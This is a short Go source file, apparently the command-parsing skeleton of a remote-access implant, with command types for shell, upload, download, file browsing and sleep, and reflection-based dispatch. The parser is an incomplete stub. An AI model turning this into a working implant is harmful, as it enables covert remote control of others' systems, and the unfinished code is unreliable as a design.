package command

import (
	"bytes"
	"errors"
	"reflect"
)

const (
	CMD_TYPE_SLEEP = iota
	CMD_TYPE_SHELL
	CMD_TYPE_UPLOAD_START
	CMD_TYPE_UPLOAD_LOOP
	CMD_TYPE_DOWNLOAD
	CMD_TYPE_EXIT
	CMD_TYPE_CD
	CMD_TYPE_PWD
	CMD_TYPE_FILE_BROWSE
)

type ICommand interface {
	Unmarshall(data []byte) error
	Execute() error
}

type Commnad struct {
	Operate string
}

func (c *Commnad) Execute() (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New("execute failed")
		}
	}()
	ref := reflect.ValueOf(c)
	method := ref.MethodByName(c.Operate)
	method.Call(nil)
	return nil
}

func parseFragment(buf *bytes.Buffer, cursor *int) (fragment []byte, fragmentType int) {
	return
}

func Parse(buf *bytes.Buffer, cursor *int) (cmd ICommand, err error) {
	fragment, fragmentType := parseFragment(buf, cursor)

	switch fragmentType {
	case CMD_TYPE_SHELL:
		cmd = new(ShellCommand)
	}

	err = cmd.Unmarshall(fragment)
	return cmd, err
}
